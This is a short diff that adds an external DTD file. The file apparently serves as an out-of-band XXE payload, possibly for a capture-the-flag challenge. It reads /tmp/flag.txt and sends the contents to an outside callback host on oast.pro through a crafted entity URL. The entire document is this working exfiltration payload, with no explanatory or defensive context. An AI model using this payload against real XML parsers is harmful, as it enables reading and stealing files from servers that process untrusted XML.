@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://d6iiomqsbufkkah58m70xka1bh1ed8k3u.oast.pro/?x=%file;'>">
+%eval;
+%exfil;
